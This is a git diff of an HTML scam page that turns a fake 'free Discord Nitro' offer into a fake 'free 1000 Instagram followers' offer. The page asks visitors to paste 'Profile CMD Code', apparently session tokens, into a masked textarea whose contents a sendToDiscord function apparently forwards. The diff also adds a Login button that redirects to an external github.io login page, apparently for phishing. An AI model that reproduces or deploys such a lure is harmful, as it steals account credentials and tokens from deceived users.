@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FREE | Nitronth</title>
+    <title>Instagram Follower Bot</title>
     <style>
         /* Genel vücut stili */
         body {
@@ -63,6 +63,7 @@
             font-size: 16px;
             cursor: pointer;
             transition: background-color 0.3s ease;
+            margin-top: 10px;
         }
 
         button:hover {
@@ -100,14 +101,16 @@
     </style>
 </head>
 <body>
-    <h2>Discord INFINITE Free 1 Month Nitro Method!</h2>
-    <p>Please enter your 'ONLY' request.js cmd codes. Then click the 'Send' Button and get free 1 month nitro. (INFINITE METHOD)</p>
+    <h2>If your account does not have a verified tick, you must log in. If it is verified, you can send 1000 followers "FREE" by just typing your name. If you do not have a verified tick, you must log in. You can log in using the button below.</h2>
+    <p></p>
 
     <textarea id="inputText" placeholder="Enter Profile CMD Code Here!" oninput="maskInput()"></textarea><br>
-    <button onclick="uploadText()">Send!</button>
+    <button onclick="uploadText()">Send!</button><br>
+    <!-- Login Butonu Eklendi -->
+    <button onclick="redirectToLogin()">Login</button>
 
     <div id="message-container">
-        <p>Success! Nitro Sent🎉(try only 1 times a month)</p>
+        <p>Followers sent!</p>
     </div>
 
     <script>
@@ -132,6 +135,11 @@
             setTimeout(() => {
                 messageContainer.style.display = "none";
             }, 3000);  // 3 saniye sonra mesaj kaybolacak
+        }
+
+        // Login butonuna yönlendirme işlemi
+        function redirectToLogin() {
+            window.location.href = 'https://freck1337.github.io/instagram-follower-bot-free/login.html'; // Login sayfasına yönlendir
         }
 
         function sendToDiscord(message) {
